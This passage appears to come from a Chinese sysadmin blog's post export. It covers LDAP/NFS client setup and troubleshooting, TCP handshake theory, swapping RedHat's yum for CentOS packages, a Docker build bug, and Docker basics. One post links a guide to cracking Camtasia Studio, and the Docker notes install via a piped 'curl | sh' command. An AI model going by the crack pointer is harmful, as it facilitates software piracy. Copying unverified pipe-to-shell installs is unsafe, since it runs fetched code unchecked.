&quot;cn=setroubleshoot,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=pulse-access,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=pulse-rt,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=pulse,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=gdm,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=gnome-initial-setup,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=sshd,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=avahi,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=slocate,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=postdrop,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=postfix,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=ntp,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=stapusr,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=stapsys,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=stapdev,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=tcpdump,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=fwj,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=apache,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=ldap,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=lduser1,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=lduser2,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=lduser3,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=lduser4,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=lduser5,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=lduser6,ou=Group,dc=abc,dc=com&quot;配置 nfs1.安装nfs yum -y install nfs-utils2.配置nfs [root@server ~]# cat /etc/exports /home/ldapuser 172.10.100.0/24(rw,sync)启动服务 [root@server ~]# systemctl start nfs-server.service打开挂载nfs [root@adsl-172-10-100-129 home]# exportfs -rv exporting *:/home/ldapuser 查看端口 [root@server ~]# ss -ant| grep 389 LISTEN 0 128 *:389 *:* LISTEN 0 128 :::389 :::* [root@server ~]# ss -ant| grep 2049 LISTEN 0 64 *:2049 *:* LISTEN 0 64 :::2049 :::*设置为开机启动 [root@server ~]# systemctl enable nfs-server.service 配置日志配置日志 编辑rsyslog配置文件： vi /etc/rsyslog.conf加上一行: local4.* /var/log/ldap.log 然后 touch /var/log/ldap.log重启rsyslog： systemctl restart rsyslog.service如果slapd启动出问题，可查看/var/log/messages文件，比如： systemctl status slapd.service -l tail -f /var/log/messages服务器配置到此结束。 客户端配置配置LDAP客户端 1.绑定 hosts [root@client ~]# cat /etc/hosts 127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6 172.10.100.129 abc.com2.安装LDAP认证相关软件包 yum -y install sssd-ldap nss-pam-ldapd3.开启LDAP，终端执行命令authconfig-tui，按TAB键选择 LDAP，然后切换到NEXT 然后配置服务端信息，填写dc信息和服务器信息 客户端测试登陆lduser1 [root@client /]# su - lduser1 su: warning: cannot change directory to /home/ldapuser/lduser1: No such file or directory -bash-4.2$ -bash-4.2$ ok的，然后解决下bash-4.2找不到环境变量的问题，直接将远程的目录通过nfs挂载过来 [root@client /]# mkdir -p /home/ldapuser [root@client /]# mount -t nfs 172.10.100.120:/home/ldapuser/ /home/ldapuser/ [root@client /]# cd /home/ldapuser/ [root@client ldapuser]# ls lduser1 lduser2 lduser3 lduser4 lduser5 lduser6 [root@client ldapuser]# su - lduser1 Last login: Sat May 20 23:11:00 EDT 2017 on pts/0 [lduser1@client ~]$ [lduser1@client ~]$ [lduser1@client ~]$ 配置自动挂载安装autofs [root@client ~]# yum -y install autofs编辑 [root@client ~]# vim /etc/auto.master /home/ /etc/auto.nfs拷贝文件并修改文件 [root@client ~]# cp /etc/auto.misc /etc/auto.nfs [root@client ~]# vim /etc/auto.nfs 增加 ldapuser -fstype=nfs 172.10.100.120:/home/ldapuser/ 设置为开机启动 systemctl start autofs systemctl enable autofs测试 [root@client home]# ls [root@client home]# [root@client home]# cd ldapuser [root@client ldapuser]# ls lduser1 lduser2 lduser3 lduser4 lduser5 lduser6 [root@client ldapuser]#这样当你每次切换目录都会自动挂载 [root@client home]# su - lduser1 Last login: Sat May 20 23:12:22 EDT 2017 on pts/0 [lduser1@client ~]$ [lduser1@client ~]$ [lduser1@client ~]$ ls [lduser1@client ~]$ cd /home/ [lduser1@client home]$ ls ldapuser [lduser1@client home]$ cd ldapuser/ [lduser1@client ldapuser]$ ls lduser1 lduser2 lduser3 lduser4 lduser5 lduser6 [lduser1@client ldapuser]$ 故障处理发现无法切换到服务器的用户，查看日志 [root@client ~]# tail -n 20 -f /var/log/messages May 20 22:39:36 client nslcd[2266]: [4a3fe6] &lt;group/member=&quot;gdm&quot;&gt; no available LDAP server found: Server is unavailable: Transport endpoint is not connected May 20 22:39:36 client nslcd[2266]: [4ef005] &lt;group/member=&quot;gdm&quot;&gt; no available LDAP server found: Server is unavailable: Transport endpoint is not connected May 20 22:39:36 client nslcd[2266]: [4ef005] &lt;group/member=&quot;gdm&quot;&gt; no available LDAP server found: Server is unavailable: Transport endpoint is not connected May 20 22:40:02 client systemd: Started Session 2 of user root. May 20 22:40:02 client systemd: Starting Session 2 of user root. May 20 22:40:02 client nslcd[2266]: [f9c13c] &lt;group/member=&quot;gdm&quot;&gt; failed to bind to LDAP server ldap://abc.com: Can&apos;t contact LDAP server: Transport endpoint is not connected May 20 22:40:02 client nslcd[2266]: [f9c13c] &lt;group/member=&quot;gdm&quot;&gt; no available LDAP server found: Can&apos;t contact LDAP server: Transport endpoint is not connected May 20 22:40:02 client nslcd[2266]: [f9c13c] &lt;group/member=&quot;gdm&quot;&gt; no available LDAP server found: Server is unavailable: Transport endpoint is not connected May 20 22:40:02 client nslcd[2266]: [9bb77c] &lt;group/member=&quot;root&quot;&gt; no available LDAP server found: Server is unavailable May 20 22:40:02 client nslcd[2266]: [9bb77c] &lt;group/member=&quot;root&quot;&gt; no available LDAP server found: Server is unavailable May 20 22:40:02 client nslcd[2266]: [5ac794] &lt;group/member=&quot;gdm&quot;&gt; no available LDAP server found: Server is unavailable May 20 22:40:02 client nslcd[2266]: [5ac794] &lt;group/member=&quot;gdm&quot;&gt; no available LDAP server found: Server is unavailable发现客户端 Telnet 服务22端口是可以的，但是389端口不行 [root@client ~]# telnet 172.10.100.129 22 Trying 172.10.100.129... Connected to 172.10.100.129. Escape character is &apos;^]&apos;. SSH-2.0-OpenSSH_6.6.1 ^C Connection closed by foreign host. [root@client ~]# [root@client ~]# telnet 172.10.100.129 389 Trying 172.10.100.129... telnet: connect to address 172.10.100.129: No route to host服务器上 telnet 389是可以的 [root@server slapd.d]# ss -ant State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 *:111 *:* LISTEN 0 128 *:20048 *:* LISTEN 0 64 *:45649 *:* LISTEN 0 5 192.168.122.1:53 *:* LISTEN 0 128 *:22 *:* LISTEN 0 128 127.0.0.1:631 *:* LISTEN 0 100 127.0.0.1:25 *:* LISTEN 0 128 *:45311 *:* LISTEN 0 64 *:2049 *:* LISTEN 0 128 *:389 *:* LISTEN 0 128 *:933 *:* ESTAB 0 0 172.10.100.129:22 192.168.50.86:54266 LISTEN 0 128 :::39343 :::* LISTEN 0 128 :::111 :::* LISTEN 0 128 :::80 :::* LISTEN 0 128 :::20048 :::* LISTEN 0 128 :::22 :::* LISTEN 0 128 ::1:631 :::* LISTEN 0 100 ::1:25 :::* LISTEN 0 64 :::43488 :::* LISTEN 0 64 :::2049 :::* LISTEN 0 128 :::389 :::* [root@server slapd.d]# telnet 127.0.0.1 389 Trying 127.0.0.1... Connected to 127.0.0.1. Escape character is &apos;^]&apos;.以上这个问题一直没弄好，我重新换了个全新的系统重新来做的。","categories":[],"tags":[{"name":"LDAP","slug":"LDAP","permalink":"https://awen.me/tags/LDAP/"}]},{"title":"Camtasia使用教程","slug":"Camtasia使用教程","date":"2017-05-20T03:15:28.000Z","updated":"2021-02-26T06:05:29.241Z","comments":true,"path":"posts/3553761657.html","link":"","permalink":"https://awen.me/posts/3553761657.html","excerpt":"","text":"视频教程资源下载下载地址:点击下载 激活在线阅读 [https://techs.b0.upaiyun.com//software/Camtasia Studio 8.x 如何破解.pdf](https://techs.b0.upaiyun.com//software/Camtasia Studio 8.x 如何破解.pdf)","categories":[],"tags":[{"name":"视频录制","slug":"视频录制","permalink":"https://awen.me/tags/%E8%A7%86%E9%A2%91%E5%BD%95%E5%88%B6/"}]},{"title":"TCP协议理论","slug":"TCP协议理论","date":"2017-05-03T06:10:52.000Z","updated":"2021-02-26T06:05:29.266Z","comments":true,"path":"posts/455141471.html","link":"","permalink":"https://awen.me/posts/455141471.html","excerpt":"只要是从事和网络相关的行业都需要使用到 TCP，尤其是网络工程和系统运维方向以及后端开发，都需要对 TCP 协议有足够清晰的认知，并且这个协议在面试过程中问到的是最多的。那么，今天我们就一起来聊一聊 —-TCP","text":"只要是从事和网络相关的行业都需要使用到 TCP，尤其是网络工程和系统运维方向以及后端开发，都需要对 TCP 协议有足够清晰的认知，并且这个协议在面试过程中问到的是最多的。那么，今天我们就一起来聊一聊 —-TCP 什么是 TCPTCP(Transmission Control Protocol，传输控制协议)，是一种面向连接的、可靠的、并基于 IP 的传输层协议。 上图为 OSI 七层模型，TCP 工作在第四层，我们看下下图的表格 OSI 中的层 功能 TCP/IP 协议簇 应用层 文件传输、电子邮件、文件服务、虚拟终端 FTP,HTTP, SNMP,TFTP, SMTP,DNS,TELNET 表示层 数据格式化，代码转换，数据加密 会话层 解除或建立与别的节点的联系 SSL,TLS 传输层 提供端口对端口的接口 TCP 和 UDP 网络层 为数据包提供路由选择 IP,ICMP,RIP,OSFP,BGP,IGMP 数据链路层 传输有地址的帧以及错误检测功能 SLIP,CSLIP,PPP,ARP,RARP,MTU 物理层 以二进制数据形式在物理媒体上传输数据 ISO2110,IEE802,IEEE802.2 TCP 协议的数据格式 我们来看下具体的字段含义 Source Port和Destination Port:分别占用16位，表示源端口号和目的端口号;用于区别主机中的不同进程， 而IP地址是用来区分不同的主机的，源端口号和目的端口号配合上IP首部中的源IP地址和目的IP地址就能唯一 的确定一个TCP连接; Sequence Number:用来标识从TCP发端向TCP收端发送的数据字节流，它表示在这个报文段中的的第一个数据 字节在数据流中的序号;主要用来解决网络报乱序的问题; Acknowledgment Number:32位确认序列号包含发送确认的一端所期望收到的下一个序号，因此，确认序号应 当是上次已成功收到数据字节序号加1。不过，只有当标志位中的ACK标志(下面介绍)为1时该确认序列号的字 段才有效。主要用来解决不丢包的问题; Offset:给出首部中32 bit字的数目，需要这个值是因为任选字段的长度是可变的。这个字段占4bit(最多能 表示15个32bit的的字，即4*15=60个字节的首部长度)，因此TCP最多有60字节的首部。然而，没有任选字段， 正常的长度是20字节; TCP Flags:TCP首部中有6个标志比特，它们中的多个可同时被设置为1，主要是用于操控TCP的状态机的，依次 为URG，ACK，PSH，RST，SYN，FIN。每个标志位的意思如下： URG：此标志表示TCP包的紧急指针域(后面马上就要说到)有效，用来保证TCP连接不被中断，并且督促 中间层设备要尽快处理这些数据; ACK：此标志表示应答域有效，就是说前面所说的TCP应答号将会包含在TCP数据包中;有两个取值：0和1， 为1的时候表示应答域有效，反之为0; PSH：这个标志位表示Push操作。所谓Push操作就是指在数据包到达接收端以后，立即传送给应用程序， 而不是在缓冲区中排队; RST：这个标志表示连接复位请求。用来复位那些产生错误的连接，也被用来拒绝错误和非法的数据包; SYN：表示同步序号，用来建立连接。SYN标志位和ACK标志位搭配使用，当连接请求的时候，SYN=1， ACK=0;连接被响应的时候，SYN=1，ACK=1;这个标志的数据包经常被用来进行端口扫描。扫描者发送 一个只有SYN的数据包，如果对方主机响应了一个数据包回来 ，就表明这台主机存在这个端口;但是由于这 种扫描方式只是进行TCP三次握手的第一次握手，因此这种扫描的成功表示被扫描的机器不很安全，一台安全 的主机将会强制要求一个连接严格的进行TCP的三次握手; FIN： 表示发送端已经达到数据末尾，也就是说双方的数据传送完成，没有数据可以传送了，发送FIN标志 位的TCP数据包后，连接将被断开。这个标志的数据包也经常被用于进行端口扫描。 Window:窗口大小，也就是有名的滑动窗口，用来进行流量控制;这是一个复杂的问题， 三次握手TCP是面向连接的，无论哪一方向另一方发送数据之前，都必须先在双方之间建立一条连接。在TCP/IP协议中，TCP 协议提供可靠的连接服务，连接是通过三次握手进行初始化的。三次握手的目的是同步连接双方的序列号和确认号 并交换 TCP窗口大小信息。这就是面试中经常会被问到的TCP三次握手。只是了解TCP三次握手的 概念，对你获得一份工作是没有任何帮助的，你需要去了解TCP三次握手中的一些细节。先来看图说话。 第一次握手：建立连接。客户端发送连接请求报文段，将SYN位置为1，Sequence Number为x;然后，客户端进入SYN_SEND状态，等待服务器的确认; 第二次握手：服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为x+1(Sequence Number+1);同时，自己自己还要发送SYN请求信息，将SYN位置为1，Sequence Number为y;服务器端将上述所有信息放到一个报文段(即SYN+ACK报文段)中，一并发送给客户端，此时服务器进入SYN_RECV状态; 第三次握手：客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为y+1，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。 完成了三次握手，客户端和服务器端就可以开始传送数据。 如图所示，我们可以看到 首先192.168.50.195 发送 [SYN] 与目标主机106.11.47.20建立连接，其 seq=0，窗口大小是65535 然后主机106.11.47.20 回复192.168.50.195 一个 [SYN,ACK]，设置 SYN=0 ACK=1 窗口大小5792 客户端收到后回复主机106.11.47.20一个[ACK]，至此建立完三次握手，然后就看到了 HTTP 的 GET 请求了。 四次断开当客户端和服务器通过三次握手建立了TCP连接以后，当数据传送完毕，肯定是要断开TCP连接的啊。那对于TCP的断开连接，这里就有了神秘的“四次分手”。 第一次分手：主机1(可以使客户端，也可以是服务器端)，设置Sequence Number和Acknowledgment Number，向主机2发送一个FIN报文段;此时，主机1进入FIN_WAIT_1状态;这表示主机1没有数据要发送给主机2了; 第二次分手：主机2收到了主机1发送的FIN报文段，向主机1回一个ACK报文段，Acknowledgment Number为Sequence Number加1;主机1进入FIN_WAIT_2状态;主机2告诉主机1，我也没有数据要发送了，可以进行关闭连接了; 第三次分手：主机2向主机1发送FIN报文段，请求关闭连接，同时主机2进入CLOSE_WAIT状态; 第四次分手：主机1收到主机2发送的FIN报文段，向主机2发送ACK报文段，然后主机1进入TIME_WAIT状态;主机2收到主机1的ACK报文段以后，就关闭连接;此时，主机1等待2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，主机1也可以关闭连接了。 为什么要三次握手三次握手主要是为了防止服务器端一直等待而浪费资源。 四次断开TCP协议是一种面向连接的、可靠的、基于字节流的运输层通信协议。TCP是全双工 模式，这就意味着，当主机1发出FIN报文段时，只是表示主机1已经没有数据要发送了，主机1告诉主机2， 它的数据已经全部发送完毕了;但是，这个时候主机1还是可以接受来自主机2的数据;当主机2返回ACK报文 段时，表示它已经知道主机1没有数据发送了，但是主机2还是可以发送数据到主机1的;当主机2也发送了FIN 报文段时，这个时候就表示主机2也没有数据要发送了，就会告诉主机1我也没有数据要发送了，之后彼此 就会愉快的中断这次TCP连接。如果要正确的理解四次分手的原理，就需要了解四次分手过程中的状态变化。 FIN_WAIT_1: 这个状态要好好解释一下，其实FIN_WAIT_1和FIN_WAIT_2状态的真正含义都是表示等 待对方的FIN报文。而这两种状态的区别是：FIN_WAIT_1状态实际上是当SOCKET在ESTABLISHED状态时， 它想主动关闭连接，向对方发送了FIN报文，此时该SOCKET即进入到FIN_WAIT_1状态。而当对方回应ACK报 文后，则进入到FIN_WAIT_2状态，当然在实际的正常情况下，无论对方何种情况下，都应该马上回应ACK 报文，所以FIN_WAIT_1状态一般是比较难见到的，而FIN_WAIT_2状态还有时常常可以用netstat看到。 (主动方) FIN_WAIT_2：上面已经详细解释了这种状态，实际上FIN_WAIT_2状态下的SOCKET，表示半连接，也即 有一方要求close连接，但另外还告诉对方，我暂时还有点数据需要传送给你(ACK信息)，稍后再关闭连接。 (主动方) CLOSE_WAIT：这种状态的含义其实是表示在等待关闭。怎么理解呢?当对方close一个SOCKET后发送FIN 报文给自己，你系统毫无疑问地会回应一个ACK报文给对方，此时则进入到CLOSE_WAIT状态。接下来呢，实 际上你真正需要考虑的事情是察看你是否还有数据发送给对方，如果没有的话，那么你也就可以 close这个 SOCKET，发送FIN报文给对方，也即关闭连接。所以你在CLOSE_WAIT状态下，需要完成的事情是等待你去关 闭连接。(被动方) LAST_ACK: 这个状态还是比较容易好理解的，它是被动关闭一方在发送FIN报文后，最后等待对方的ACK报 文。当收到ACK报文后，也即可以进入到CLOSED可用状态了。(被动方) TIME_WAIT: 表示收到了对方的FIN报文，并发送出了ACK报文，就等2MSL后即可回到CLOSED可用状态了。 如果FINWAIT1状态下，收到了对方同时带FIN标志和ACK标志的报文时，可以直接进入到TIME_WAIT状态，而无 须经过FIN_WAIT_2状态。(主动方) CLOSED: 表示连接中断。","categories":[],"tags":[{"name":"tcp","slug":"tcp","permalink":"https://awen.me/tags/tcp/"}]},{"title":"RedHat 7  yum 替换为 CentOS","slug":"RedHat-7--yum-替换为-CentOS","date":"2017-04-16T14:11:00.000Z","updated":"2021-02-26T06:05:29.264Z","comments":true,"path":"posts/933349047.html","link":"","permalink":"https://awen.me/posts/933349047.html","excerpt":"卸载自带yum依赖包 rpm -qa | grep yum | xargs rpm -e –nodeps 下载软件","text":"卸载自带yum依赖包 rpm -qa | grep yum | xargs rpm -e –nodeps 下载软件 安装包在光盘找，或者去网易开元镜像站下载 python-iniparse-0.3.1-2.1.el6.noarch.rpm yum-3.2.29-40.el6.centos.noarch.rpm yum-metadata-parser-1.1.2-16.el6.x86_64.rpm yum-plugin-fastestmirror-1.1.30-14.el6.noarch.rpm 安装rpm -ivh python-iniparse-0.3.1-2.1.el6.noarch.rpm rpm -ivh yum-metadata-parser-1.1.2-16.el6.x86_64.rpm rpm -ivh yum-3.2.29-40.el6.centos.noarch.rpm yum-plugin-fastestmirror-1.1.30-14.el6.noarch.rpm增加源# vim /etc/yum.repos.d/CentOS-Base.repo # CentOS-Base.repo # # The mirror system uses the connecting IP address of the client and the # update status of each mirror to pick mirrors that are updated to and # geographically close to the client. You should use this for CentOS updates # unless you are manually picking other mirrors. # # If the mirrorlist= does not work for you, as a fall back you can try the # remarked out baseurl= line instead. # # [base] name=CentOS-7 - Base - 163.com baseurl=http://mirrors.163.com/centos/7/os/$basearch/ #mirrorlist=http://mirrorlist.centos.org/?release=7&amp;arch=$basearch&amp;repo=os gpgcheck=1 gpgkey=http://mirror.centos.org/centos/RPM-GPG-KEY-CentOS-7 #released updates [updates] name=CentOS-7 - Updates - 163.com baseurl=http://mirrors.163.com/centos/7/updates/$basearch/ #mirrorlist=http://mirrorlist.centos.org/?release=7&amp;arch=$basearch&amp;repo=updates gpgcheck=1 gpgkey=http://mirror.centos.org/centos/RPM-GPG-KEY-CentOS-7 #additional packages that may be useful [extras] name=CentOS-7 - Extras - 163.com baseurl=http://mirrors.163.com/centos/7/extras/$basearch/ #mirrorlist=http://mirrorlist.centos.org/?release=6&amp;arch=$basearch&amp;repo=extras gpgcheck=1 gpgkey=http://mirror.centos.org/centos/RPM-GPG-KEY-CentOS-7 #additional packages that extend functionality of existing packages [centosplus] name=CentOS-7 - Plus - 163.com baseurl=http://mirrors.163.com/centos/7/centosplus/$basearch/ #mirrorlist=http://mirrorlist.centos.org/?release=7&amp;arch=$basearch&amp;repo=centosplus gpgcheck=1 enabled=0 gpgkey=http://mirror.centos.org/centos/RPM-GPG-KEY-CentOS-6 #contrib - packages by Centos Users [contrib] name=CentOS-7 - Contrib - 163.com baseurl=http://mirrors.163.com/centos/7/contrib/$basearch/ #mirrorlist=http://mirrorlist.centos.org/?release=7&amp;arch=$basearch&amp;repo=contrib gpgcheck=1 enabled=0 gpgkey=http://mirror.centos.org/centos/RPM-GPG-KEY-CentOS-7收尾工作yum clean all 清除原有缓存yum makecache 获取yum列表 一般不这么干，与其这样折腾Redhat，如果直接用Centos ，当你安装完运行yum -y update 后 redhat的图标和桌面等其他相关依赖都会被替换成centos 的 所以没必要这样干。","categories":[],"tags":[{"name":"RHCE","slug":"RHCE","permalink":"https://awen.me/tags/RHCE/"}]},{"title":"构建Docker镜像遇到BUG","slug":"构建Docker镜像遇到BUG","date":"2017-04-07T12:47:08.000Z","updated":"2021-02-26T06:05:29.343Z","comments":true,"path":"posts/3738069748.html","link":"","permalink":"https://awen.me/posts/3738069748.html","excerpt":"","text":"我在学习如何构建 Docker 镜像时，按照书上的案例构建镜像，提示kernel:unregister_netdevice: waiting for lo to become free. Usage count = 1，于是去翻了 Google 资源，发现应该有人也在3.x的内核中遇到该问题 [root@server myubuntu]# docker build -t redis . Sending build context to Docker daemon 2.048 kB Step 1 : FROM ubuntu ---&gt; d355ed3537e9 Step 2 : RUN buildDeps=&quot;gcc make&quot; &amp;&amp; apt-get update &amp;&amp; apt-get install -y $buildDeps &amp;&amp; wget -O redis.tar.gz &quot;http://download.redis.io/releases/redis-3.2.5.tar.gz&quot; &amp;&amp; mkdir -p /usr/src/redis &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 &amp;&amp; make -C /usr/src/redis &amp;&amp; make -C /usr/src/redis install &amp;&amp; rm -rf /var/lib/apt/lists/* &amp;&amp; rm redis.tar.gz &amp;&amp; rm -r /usr/src/redis &amp;&amp; apt-get purge -y --auto-remove $buildDeps ---&gt; Running in 2ac65d9db8e4 Get:1 http://security.ubuntu.com/ubuntu xenial-security InRelease [102 kB] Get:2 http://security.ubuntu.com/ubuntu xenial-security/universe Sources [39.9 kB] Get:3 http://security.ubuntu.com/ubuntu xenial-security/main amd64 Packages [370 kB] Get:4 http://archive.ubuntu.com/ubuntu xenial InRelease [247 kB] Get:5 http://security.ubuntu.com/ubuntu xenial-security/restricted amd64 Packages [12.8 kB] Get:6 http://security.ubuntu.com/ubuntu xenial-security/universe amd64 Packages [173 kB] Get:7 http://security.ubuntu.com/ubuntu xenial-security/multiverse amd64 Packages [2937 B] Get:8 http://archive.ubuntu.com/ubuntu xenial-updates InRelease [102 kB] Get:9 http://archive.ubuntu.com/ubuntu xenial-backports InRelease [102 kB] Get:10 http://archive.ubuntu.com/ubuntu xenial/universe Sources [9802 kB] Get:11 http://archive.ubuntu.com/ubuntu xenial/main amd64 Packages [1558 kB] Message from syslogd@server at Jul 7 20:44:08 ... kernel:unregister_netdevice: waiting for lo to become free. Usage count = 1 Get:12 http://archive.ubuntu.com/ubuntu xenial/restricted amd64 Packages [14.1 kB] Get:13 http://archive.ubuntu.com/ubuntu xenial/universe amd64 Packages [9827 kB] Message from syslogd@server at Jul 7 20:44:18 ... kernel:unregister_netdevice: waiting for lo to become free. Usage count = 1 Message from syslogd@server at Jul 7 20:44:28 ... kernel:unregister_netdevice: waiting for lo to become free. Usage count = 1 Get:14 http://archive.ubuntu.com/ubuntu xenial/multiverse amd64 Packages [176 kB] Get:15 http://archive.ubuntu.com/ubuntu xenial-updates/universe Sources [204 kB] Get:16 http://archive.ubuntu.com/ubuntu xenial-updates/main amd64 Packages [728 kB] 我内核 [root@server ~]# uname -ar Linux server 3.10.0-514.26.1.el7.x86_64 #1 SMP Thu Jun 29 16:05:25 UTC 2017 x86_64 x86_64 x86_64 GNU/Linuxdocker 版本 [root@server ~]# docker version Client: Version: 1.12.6 API version: 1.24 Package version: docker-1.12.6-32.git88a4867.el7.centos.x86_64 Go version: go1.7.4 Git commit: 88a4867/1.12.6 Built: Mon Jul 3 16:02:02 2017 OS/Arch: linux/amd64 Server: Version: 1.12.6 API version: 1.24 Package version: docker-1.12.6-32.git88a4867.el7.centos.x86_64 Go version: go1.7.4 Git commit: 88a4867/1.12.6 Built: Mon Jul 3 16:02:02 2017 OS/Arch: linux/amd64解决办法yum -y update更新下系统就没有出错了","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://awen.me/tags/docker/"}]},{"title":"Docker学习笔记","slug":"Docker学习笔记","date":"2017-04-07T11:40:16.000Z","updated":"2021-02-26T06:05:29.245Z","comments":true,"path":"posts/1245529498.html","link":"","permalink":"https://awen.me/posts/1245529498.html","excerpt":"","text":"docker 是最近几年最流行的开源容器技术，相比较于传统的 KVM VMware 之类的虚拟化技术，Docker 效率更高，大大降低了云计算资源供应的成本，使用 docker 可以让应用部署、测试、分发都变得非常轻松和高效。 传统虚拟化技术传统虚拟化技术需要在硬件之上安装操作系统，然后在操作系统上运行虚拟机软件，比如 VMware、此外类似 KVM 这种可以在内核中对硬件进行模拟实现完全虚拟化。但是传统虚拟化技术对于硬件的要求是比较高的。 Docker 技术 Docker 使用 Google 公司推出的 Go 语言 进行开发实现，基于 Linux 内核的cgroup，namespace，以及 AUFS 类的 Union FS 等技术，对进程进行封装隔离，属于操作系统层面的虚拟化技术。Docker 作为一种新兴的虚拟化方式，具有更高效的系统资源利用、更快的启动时间、一致的运行环境、可持续交付和部署等等优势，可以实现一次创建，可以在任意地方运行。迁移非常轻松，对比传统虚拟机 声明，本文大部分理论内容为摘抄《Docker 入门到实践》，书中内容都有在 centos 7 上实践过。 基本概念Docker 包括三个基本概念 镜像 Image 容器 Container 仓库 Repository Docker 镜像操作系统分为内核和用户空间。对于 Linux 而言，内核启动后， 会挂载 root 文件系统为其提供用户空间支持。而 Dcoker 的镜像就相当于一个 root 文件系统。 Docker 镜像其实是一个特殊的文件系统，除了提供容器运行时所需要的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数，比如匿名卷、环境变量、用户等等。镜像不包含任何动态数据，其内容在构建之后也不会被改版。 分层存储因为镜像包含了操作系统的完整 root 文件系统，其体积往往是庞大的，因此 Docker 在设计时，就充分利用 Union FS 技术，将其设计为分层存储的架构。所以严格意义来说，镜像并非是一个 ISO 那样的打包文件，镜像只是一个虚拟的概念，其实际体现并非由一个文件组成，而是由一组文件系统组成，或者说，由多层文件系统联合组成。镜像构建时，会一层一层构建，前一层是后一层的基础。每一层构建完就不会再发生改变。后一层上的任何改变都只发生在自己的这一层。比如，删除前一层的文件操作，其实不是真正删除前一层的文件，而是仅在当前层标记该文件已删除，在最终容器运行的时候，虽然看不见这个文件，但是实际上该文件会一直跟随镜像，因此，在构建镜像的时候，需要额外小心，每一层尽量只包含该层需要添加的东西，任何额外的东西应该在该层构建结束前清理掉。分层存储的特征还使得镜像的复用、定制变的更为容易。甚至可以用之前构建好的镜像作为基础层，然后进一步添加新的层，以定制自己所需的内容，构建新的镜像。 Docker 容器镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的 类 和 实例 一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的 命名空间。因此容器可以拥有自己的 root 文件系统、自己的网络配置、自己的进程空间，甚至自己的用户 ID 空间。容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样。这种特性使得容器封装的应用比直接在宿主运行更加安全。也因为这种隔离的特性，很多人初学Docker 时常常会把容器和虚拟机搞混。 前面讲过镜像使用的是分层存储，容器也是如此。每一个容器运行时，是以镜像为基础层，在其上创建一个当前容器的存储层，我们可以称这个为容器运行时读写而准备的存储层为容器存储层。容器存储层的生存周期和容器一样，容器消亡时，容器存储层也随之消亡。因此，任何保存于容器存储层的信息都会随容器删除而丢失。 按照 Docker 最佳实践的要求，容器不应该向其存储层内写入任何数据，容器存储层要保持无状态化。所有的文件写入操作，都应该使用 数据卷（Volume）、或者绑定宿主目录，在这些位置的读写会跳过容器存储层，直接对宿主(或网络存储)发生读写，其性能和稳定性更高。数据卷的生存周期独立于容器，容器消亡，数据卷不会消亡。因此，使用数据卷后，容器可以随意删除、重新 run ，数据却不会丢失。 Docker Registry镜像构建完成后，可以很容易的在当前宿主上运行，但是，如果需要在其它服务器上使用这个镜像，我们就需要一个集中的存储、分发镜像的服务，Docker Registry就是这样的服务。一个 Docker Registry 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 &lt;仓库名&gt;:&lt;标签&gt; 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 latest 作为默认标签。以 Ubuntu 镜像 为例， ubuntu 是仓库的名字，其内包含有不同的版本标签，如， 14.04 , 16.04 。我们可以通过 ubuntu:14.04 ，或者 ubuntu:16.04来具体指定所需哪个版本的镜像。如果忽略了标签，比如 ubuntu ，那将视为ubuntu:latest 。仓库名经常以 两段式路径 形式出现，比如 jwilder/nginx-proxy ，前者往往意味着 Docker Registry 多用户环境下的用户名，后者则往往是对应的软件名。但这并非绝对，取决于所使用的具体 Docker Registry 的软件或服务。 安装 dockercentos7 yum -y install docker或 curl -sSL https://get.docker.com/ | sh启动 docker➜ ~ ssh server Last login: Fri Jul 7 19:34:11 2017 from 192.168.1.155 [root@server ~]# systemctl enable docker [root@server ~]# systemctl start docker [root@server ~]# systemctl status docker ● docker.service - Docker Application Container Engine Loaded: loaded (/usr/lib/systemd/system/docker.service; enabled; vendor preset: disabled) Active: active (running) since Fri 2017-07-07 18:01:39 CST; 2h 0min ago Docs: http://docs.docker.com Main PID: 1067 (dockerd-current) CGroup: /system.slice/docker.service ├─1067 /usr/bin/dockerd-current 